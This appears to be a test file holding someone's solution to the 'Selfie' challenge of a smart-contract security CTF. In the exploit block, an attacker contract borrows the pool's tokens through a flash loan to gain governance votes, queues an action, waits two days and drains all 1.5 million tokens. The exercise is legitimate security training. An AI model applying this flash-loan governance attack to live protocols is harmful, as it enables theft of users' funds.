const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
        const TOKENS_TO_SEND = ethers.utils.parseEther('750000'); // 0.75 million tokens

        const SelfieSolutionFactory = await ethers.getContractFactory('SelfieSolution', attacker);
        this.attackerContract = await SelfieSolutionFactory.deploy(this.pool.address, this.token.address, attacker.address, this.governance.address);

        //get the snapshot ID
        //ERC20Snapshot does not allow to fetch the latest snapshot id.

        let result;
        result = await this.attackerContract.getSnap();

        //before snapshot
        console.log("Snapshot ID before taking snapshot", result[0].toString());
        console.log("Snapshot balance before taking snapshot", result[1].toString());

        //initiate the attack
        //I was earlier taking flash loan of 0 amount
        await this.attackerContract.attack(TOKENS_IN_POOL);

        result = await this.attackerContract.getSnap();

        //after snapshot
        console.log("Snapshot ID after taking snapshot", result[0].toString());
        console.log("Snapshot balance after taking snapshot", result[1].toString());

        //wait for 2 days
        await time.increase(time.duration.days(2));

        //execute the action
        await this.governance.executeAction(Number(result[0]));
        // await this.governance.executeAction(Number(result[0]) - 1);  //because now I am not fetching it from the current id (which is ++) but the actual id.

        await this.attackerContract.attack_complete();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
